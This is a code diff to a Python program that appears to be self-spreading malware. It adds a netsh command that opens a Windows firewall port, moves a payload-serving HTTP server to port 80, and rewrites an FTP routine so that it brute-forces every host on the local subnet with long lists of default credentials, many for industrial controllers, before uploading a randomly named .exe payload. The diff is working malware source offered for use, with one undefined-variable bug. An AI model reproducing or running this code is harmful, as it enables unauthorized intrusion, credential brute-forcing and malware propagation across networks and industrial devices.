@@ -42,9 +42,12 @@ class HTTPHandler(BaseHTTPRequestHandler):
             self.send_header('Content-type', 'application/octet-stream')
             self.end_headers()
             payload_path = download_payload()
-            if payload_path is None: return
-            with open(payload_path, 'rb') as f:
-                self.wfile.write(f.read())
+            if os.path.exists(payload_path):
+                with open(payload_path, 'rb') as f:
+                    self.wfile.write(f.read())
+            else:
+                self.send_response(404)
+                self.end_headers()
         elif self.path == '/login':
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
@@ -98,7 +101,12 @@ class HTTPHandler(BaseHTTPRequestHandler):
 # Start HTTP server
 def start_http_server():
     try:
-        server = HTTPServer(('0.0.0.0', 8080), HTTPHandler)
+        # Add firewall rule for port 80
+        subprocess.run(
+            'netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=80',
+            shell=True, capture_output=True, text=True
+        )
+        server = HTTPServer(('0.0.0.0', 80), HTTPHandler)
         threading.Thread(target=server.serve_forever, daemon=True).start()
     except:
         pass
@@ -107,19 +115,173 @@ def start_http_server():
 def ftp_spread():
     try:
         local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
+        common_user = [
+            'qbf77101',
+            'sales',
+            'anonymous',
+            'administrator',
+            'accounting',
+            'dmftp',
+            'default',
+            'dm',
+            'oracle',
+            'ftp',
+            'Root',
+            'ADMIN',
+            'avery',
+            'se',
+            'MELSEC',
+            'PlcmSpIp',
+            'nobody',
+            'sysdiag',
+            'adtec',
+            'root',
+            'mysql',
+            'admin',
+            '123456',
+            'john',
+            'webserver',
+            'abc123',
+            'hr',
+            'ftp_boot',
+            'sa',
+            'IEIeMerge',
+            'USER',
+            'su',
+            'supervisor',
+            'test',
+            'fdrusers',
+            'mail',
+            'device',
+            'postmaster',
+            'User',
+            'pcfactory',
+            'loader',
+            'user',
+            'support',
+            'post',
+            'www-data',
+            'nmt',
+            'ntpupdate',
+            'marketing',
+            'nic2212',
+            'httpadmin',
+            'apc',
+            'localadmin',
+            'user1',
+            'Admin',
+            'QNUDECPU',
+            'qwerty',
+            'none',
+            'password',
+            'ftpuser',
+            'pr',
+            'MayGion',
+            'beijer',
+            'a',
+            'webmaster',
+            'uploader',
+            '111111',
+            'manager',
+            'Guest',
+            'instrument',
+            'wsupgrade',
+        ]
+        common_pass = [
+            'USER',
+            'admin',
+            'Janitza',
+            'eqidemo',
+            'spam',
+            'anonymous',
+            'supervisor',
+            'factorycast@schneider',
+            'user00',
+            'password',
+            '12hrs37',
+            '123456',
+            'beijer',
+            'maygion.com',
+            'webadmin',
+            'b1uRR3',
+            'test2',
+            'webmaster',
+            'eMerge',
+            'pass1',
+            'test',
+            'test123',
+            'nobody',
+            'test1',
+            'root',
+            'news',
+            'info',
+            'ftp',
+            'ntpupdate',
+            'webpages',
+            'sresurdf',
+            'uploader',
+            'pcfactory',
+            'ZYPCOM',
+            'apc',
+            'admin12345',
+            'mysql',
+            'system',
+            'none',
+            '1111',
+            'ftp_boot',
+            'MELSEC',
+            'guest',
+            'nas',
+            'hexakisoctahedron',
+            'techsupport',
+            'localadmin',
+            'default',
+            'wsupgrade',
+            'stingray',
+            'dpstelecom',
+            'fwdownload',
+            'abc123',
+            'web',
+            'testingpw',
+            'ko2003wa',
+            'oracle',
+            'cvsadm',
+            '1234',
+            'testing',
+            'test4',
+            'wago',
+            'test3',
+            'tester',
+            '12345',
+            'avery',
+            'instrument',
+            'user',
+            'testuser',
+            'fhttpadmin',
+            'QNUDECPU',
+            '9999',
+            'rootpasswd',
+            'PlcmSpIp',
+            'poiuypoiuy',
+            'sysadm'
+        ]
+
         for i in range(1, 255):
             ip = f'{local_ip}.{i}'
-            try:
-                ftp = ftplib.FTP(ip, timeout=1)
-                ftp.login('anonymous', '')
-                random_name = f'{generate_random_name()}.exe'
-                payload_path = download_payload()
-                if payload_path:
-                    with open(payload_path, 'rb') as f:
-                        ftp.storbinary(f'STOR {random_name}', f)
-                ftp.quit()
-            except:
-                pass
+            for user in common_users:
+                for pwd in common_pass:
+                    try:
+                        ftp = ftplib.FTP(ip, timeout=1)
+                        ftp.login(user, pwd)
+                        random_name = f'{generate_random_name()}.exe'
+                        payload_path = download_payload()
+                        if payload_path:
+                            with open(payload_path, 'rb') as f:
+                                ftp.storbinary(f'STOR {random_name}', f)
+                        ftp.quit()
+                        break 
+                    except:
+                        continue
     except:
         pass
 
